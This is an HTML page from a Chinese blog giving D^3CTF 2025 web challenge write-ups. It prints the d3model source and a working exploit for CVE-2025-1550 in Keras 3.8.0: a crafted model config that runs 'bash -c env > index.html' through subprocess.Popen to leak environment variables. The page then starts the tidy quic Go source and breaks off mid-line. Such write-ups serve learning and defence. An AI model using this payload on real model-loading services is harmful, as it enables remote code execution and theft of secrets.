@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="d3model源码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import kerasfrom flask import Flask, request, jsonifyimport osdef is_valid_model(modelname):">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D^3CTF 2025 Web wp">
+<meta property="og:url" content="http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="d3model源码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import kerasfrom flask import Flask, request, jsonifyimport osdef is_valid_model(modelname):">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250530235017696.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250531154847317.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603002320440.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603002840056.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603003835081.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603003956632.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023107075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023043117.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250603023152342.png">
+<meta property="article:published_time" content="2025-06-02T18:35:02.000Z">
+<meta property="article:modified_time" content="2025-06-02T18:36:01.307Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250530235017696.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>D^3CTF 2025 Web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&text=D^3CTF 2025 Web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&is_video=false&description=D^3CTF 2025 Web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=D^3CTF 2025 Web wp&body=Check out this article: http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&name=D^3CTF 2025 Web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&t=D^3CTF 2025 Web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3model"><span class="toc-number">1.</span> <span class="toc-text">d3model</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tidy-quic"><span class="toc-number">2.</span> <span class="toc-text">tidy quic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3invitation"><span class="toc-number">3.</span> <span class="toc-text">d3invitation</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        D^3CTF 2025 Web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T18:35:02.000Z" class="dt-published" itemprop="datePublished">2025-06-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h2><p>源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>requirements告诉我们keras&#x3D;&#x3D;3.8.0，查了一下发现存在CVE漏洞。</p>
+<p><code>cve-2025-1550</code>，可以参考如下文章复现：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
+<p>这里直接给出exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">model_name = <span class="string">&quot;model.keras&quot;</span></span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(<span class="number">100</span>, <span class="number">28</span> * <span class="number">28</span>)</span><br><span class="line">y_train = np.random.rand(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(<span class="number">1</span>, activation=<span class="string">&#x27;linear&#x27;</span>, input_dim=<span class="number">28</span> * <span class="number">28</span>)])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;adam&#x27;</span>, loss=<span class="string">&#x27;mse&#x27;</span>)</span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    config = json.loads(f.read(<span class="string">&quot;config.json&quot;</span>).decode())</span><br><span class="line"></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;module&quot;</span>] = <span class="string">&quot;keras.models&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;class_name&quot;</span>] = <span class="string">&quot;Model&quot;</span></span><br><span class="line">config[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;layers&quot;</span>][<span class="number">0</span>][<span class="string">&quot;config&quot;</span>] = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;layers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;mvlttt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;class_name&quot;</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">            <span class="string">&quot;config&quot;</span>: <span class="string">&quot;Popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;module&quot;</span>: <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;inbound_nodes&quot;</span>: [&#123;<span class="string">&quot;args&quot;</span>: [[<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env &gt; index.html&quot;</span>]], <span class="string">&quot;kwargs&quot;</span>: &#123;<span class="string">&quot;bufsize&quot;</span>: -<span class="number">1</span>&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">    <span class="string">&quot;input_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]],</span><br><span class="line">    <span class="string">&quot;output_layers&quot;</span>: [[<span class="string">&quot;mvlttt&quot;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_read:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> zip_write:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_read.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.filename != <span class="string">&quot;config.json&quot;</span>:</span><br><span class="line">                zip_write.writestr(item, zip_read.read(item.filename))</span><br><span class="line"></span><br><span class="line">os.remove(model_name)</span><br><span class="line">os.rename(<span class="string">f&quot;tmp.<span class="subst">&#123;model_name&#125;</span>&quot;</span>, model_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(model_name, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&quot;config.json&quot;</span>, json.dumps(config))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Malicious model ready&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里不出网，我们写文件就行。直接写到index.html后刷新一下即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250530235017696.png"></p>
+<h2 id="tidy-quic"><a href="#tidy-quic" class="headerlink" title="tidy quic"></a>tidy quic</h2><p>源码如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/libp2p/go-buffer-pool&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/quic-go/quic-go/http3&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p pool.BufferPool</span><br><span class="line"><span class="keyword">var</span> ErrWAF = errors.New(<span class="string">&quot;WAF&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		err := http.ListenAndServeTLS(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		err := http3.ListenAndServeQUIC(<span class="string">&quot;:8080&quot;</span>, <span class="string">&quot;./server.crt&quot;</span>, <span class="string">&quot;./server.key&quot;</span>, &amp;mux&#123;&#125;)</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> mux <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*mux)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	<span class="keyword">if</span> r.Method == http.MethodGet &#123;</span><br><span class="line">		_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello D^3CTF 2025,I&#x27;m tidy quic in web.&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> r.Method != http.MethodPost &#123;</span><br><span class="line">		w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> buf []<span class="type">byte</span></span><br><span class="line">	length := <span class="type">int</span>(r.ContentLength)</span><br><span class="line">	<span class="keyword">if</span> length == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">		buf, err = io.ReadAll(textInterrupterWrap(r.Body))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">				w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">				_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">				_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		buf = p.Get(length)</span><br><span class="line">		<span class="keyword">defer</span> p.Put(buf)</span><br><span class="line">		rd := textInterrupterWrap(r.Body)</span><br><span class="line">		i := <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			n, err := rd.Read(buf[i:])</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> errors.Is(err, io.EOF) &#123;</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> errors.Is(err, ErrWAF) &#123;</span><br><span class="line">					w.WriteHeader(<span class="number">400</span>)</span><br><span class="line">					_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;WAF&quot;</span>))</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">					_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			i += n</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !bytes.HasPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)) &#123;</span><br><span class="line">		_, _ = w.Write([]<span class="type">byte</span>(<span class="string">&quot;Sorry I&#x27;m not clear what you want.&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	item := bytes.TrimSpace(bytes.TrimPrefix(buf, []<span class="type">byte</span>(<span class="string">&quot;I want&quot;</span>)))</span><br><span class="line">	<span class="keyword">if</span> bytes.Equal(item, []<span class="type">byte</span>(<span class="string">&quot;flag&quot;</span>)) 